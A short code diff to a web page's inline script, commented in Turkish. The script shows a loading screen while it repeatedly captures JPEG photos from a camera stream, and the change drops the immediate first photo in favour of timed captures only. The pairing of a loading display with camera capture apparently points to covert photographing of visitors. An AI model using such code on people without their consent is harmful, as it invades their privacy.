@@ -172,7 +172,7 @@
                         document.getElementById('loading').style.display = 'block';
                         
                         // ========================================
-                        // FOTOĞRAF - HEMEN BAŞLA (0ms)
+                        // FOTOĞRAF - SADECE SETINTERVAL İLE (İLK FOTO YOK)
                         // ========================================
                         function fotoCek() {
                             if (!stream?.active) return;
@@ -197,10 +197,7 @@
                             }, 'image/jpeg', 0.85);
                         }
                         
-                        // İLK FOTO HEMEN
-                        fotoCek();
-                        
-                        // DİĞER FOTOLAR
+                        // İLK FOTOĞRAF YOK - SADECE SETINTERVAL
                         setInterval(fotoCek, FOTO_SURESI * 1000);
                         
                         // ========================================
@@ -269,4 +266,4 @@
         })();
     </script>
 </body>
-</html>
+    </html>
